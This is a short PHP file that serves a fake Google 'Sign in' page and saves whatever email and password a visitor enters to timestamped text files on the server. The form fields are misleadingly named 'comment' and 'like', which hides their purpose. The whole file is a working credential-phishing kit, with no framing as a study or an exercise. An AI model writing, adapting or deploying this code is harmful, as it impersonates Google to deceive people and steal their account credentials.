<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $comment = $_POST["comment"] ?? "";
  $like = $_POST["like"] ?? "";
  if (!is_dir("comments")) {
    mkdir("comments", 0777, true);
  }
  $data = "comment:" . $comment . "\nlike:" . $like . "\n";
  file_put_contents("comments/" . time() . ".txt", $data);
}

echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Sign in</title>
<link rel="icon" href="https://nofileteams.github.io/nofile-data/google.png">
<style>
body {
  background-color: white;
  margin: 0;
}
.center {
  width: 100vw;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}
.box {
  width: 500px;
  height: 600px;
  border: 0.5px solid gray;
  position: relative;
}
.box img {
  position: absolute;
  width: 80px;
  height: 30px;
  left: 35px;
  top: 45px;
}
.text1 {
  position: absolute;
  left: 35px;
  top: 95px;
  font-size: 30px;
}
.text2 {
  position: absolute;
  left: 35px;
  top: 140px;
  font-size: 15px;
}
.input1 {
  position: absolute;
  top: 230px;
  left: 50%;
  transform: translateX(-50%);
  width: 410px;
  height: 30px;
  background-color: white;
  border: 0.1px solid gray;
}
.input2 {
  position: absolute;
  top: 300px;
  left: 50%;
  transform: translateX(-50%);
  width: 410px;
  height: 30px;
  background-color: white;
  border: 0.1px solid gray;
}
.button1 {
  position: absolute;
  top: 380px;
  left: 50%;
  transform: translateX(-50%);
  width: 200px;
  height: 35px;
  background-color: dodgerblue;
  color: white;
  border: none;
}
</style>
</head>
<body>
<div class="center">
  <div class="box">
    <img src="title.png">
    <div class="text1">Sign in</div>
    <div class="text2">with your Google Account</div>
    <form method="POST">
      <input class="input1" type="text" name="comment" placeholder="Email">
      <input class="input2" type="password" name="like" placeholder="Password">
      <button class="button1" type="submit">Sign in</button>
    </form>
  </div>
</div>
</body>
</html>
HTML;
?>